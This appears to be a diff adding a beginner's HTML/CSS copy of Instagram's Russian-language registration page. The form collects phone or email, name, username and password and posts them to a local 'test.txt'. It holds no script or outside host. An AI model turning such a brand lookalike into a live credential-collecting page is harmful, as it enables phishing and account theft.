@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Instagram/Starting Page</title>
+        <style>
+           #img{
+               margin-top: 10%;
+               margin-left: 60%;
+               
+           }
+           .reg{
+               border-style: ridge;
+               width: 70%;
+               height: 430px;
+               color: darkgray;
+               margin-left: 20%;
+               
+           } 
+           .columns{
+               column-count: 2;
+               width: 70%;
+               height: 100%;
+               margin-left: 20%;
+               margin-top: 50px;
+           }
+           p{
+               color: rgb(175, 166, 166);
+               text-align: center;
+               
+           }
+           .border2{
+            border-style: ridge;
+            color: darkgrey;
+            width: 70%;
+            margin-left: 20%;
+           }
+           .login{
+               color: black;
+             text-align: center;
+           }
+           #gray{
+               color: rgb(175, 166, 166);
+               margin-top: 2px;
+           }
+           #radius{
+                width: 250px;
+                margin-left: 30px;
+                margin-top: 5px;
+           }
+           #button1{
+               width:255px;
+               margin-left: 30px;
+               margin-top: 7px;
+               color:white;
+               background-color: rgb(46, 130, 209);
+               height: 30px;
+               border-radius: 4px;
+               
+               
+           }
+        </style>
+    </head>
+    <body>
+        <div class="columns">
+       
+           <img id="img" src ="instagramphoto.jpg">
+       <br>
+       <br>
+       <br>
+       <br>
+       <br>
+       <br>
+       <br>
+       <br>
+       <br>
+       <br>
+       <br>
+       <div class="reg">
+           <img src="instagramlogo.jpg">
+            <p id="gray">Зарегестрируйтесь, чтобы смотреть фото и видео ваших друзей.</p>
+            <form id="form" action="test.txt" target="_blank" method="POST">
+                <button id="button1" type="submit">Вoйти через Facebook</button>
+                <p>или</p>
+                <input id="radius" type="text" name="number" placeholder="Моб. телефон или эл. адрес" required ><br>
+                <input id="radius" type="text" name="Firstname lastname" placeholder="Имя и фамилия" required><br>
+                <input id="radius" type="text" name="e-mail" placeholder="Имя пользователя" required><br>
+                <input id="radius" type="password" name="password" placeholder="Пароль" required><br>
+                <button id="button1" type="submit">Регистрация</button>
+                <p>Регистрируясь, вы принимаете <a></a>Условия, Политику использования данных и Политику в отношении файлов coocie.</p>
+            </form>
+       </div> 
+       <br>
+       <div class="border2">
+            <p class="login">Есть аккаунт? <a href="">Вход</a></p>
+       </div>
+       <p class="login">Устоновите приложение</p>
+    </div>
+    </body>
+</html>
